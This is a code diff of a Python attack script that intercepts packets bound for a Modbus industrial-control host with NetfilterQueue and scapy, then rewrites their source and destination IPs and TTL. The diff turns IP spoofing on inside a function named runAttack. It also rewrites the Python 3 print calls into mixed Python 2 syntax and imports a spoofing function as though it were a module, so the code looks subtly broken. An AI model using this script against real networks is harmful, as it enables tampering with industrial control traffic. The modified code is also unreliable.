@@ -1,6 +1,5 @@
 from netfilterqueue import NetfilterQueue
 from scapy.all import *
-import IPGenerator as ipg
 
 MODBUS_SLAVE = 'ms.ics.example.com'
 
@@ -22,29 +21,30 @@ def plx(x):
     return chr(val)
 
 def runAttack(pkt):
+    import IPGenerator.spoofIP as ipg
     sc_pkt = IP(pkt.get_payload())
 
-    spoof = False
+    spoof = True
     if spoof:
-        ipSrc, ipDst, ipTTL = ipg.spoofIP(sc_pkt[IP].src, sc_pkt[IP].dst)
+        ipSrc, ipDst, ipTTL = ipg(sc_pkt[IP].src, sc_pkt[IP].dst)
         sc_pkt[IP].src = ipSrc
         sc_pkt[IP].dst = ipDst
         sc_pkt[IP].ttl = ipTTL
 
     if(IP in sc_pkt):
-        print("IP/", end='')
+        print "IP/", sys.stdout.write('')
         del sc_pkt[IP].chksum
 
     if(TCP in sc_pkt):
-        print("TCP/", end='')
+        print "TCP/", sys.stdout.write('')
         del sc_pkt[TCP].chksum
 
     if(UDP in sc_pkt):
-        print("UDP/", end='')
+        print "UDP/", sys.stdout.write('')
         del sc_pkt[UDP].chksum
 
     if(ICMP in sc_pkt):
-        print("ICMP/", end='')
+        print "ICMP/", sys.stdout.write('')
         del sc_pkt[ICMP].chksum
 
     log = False
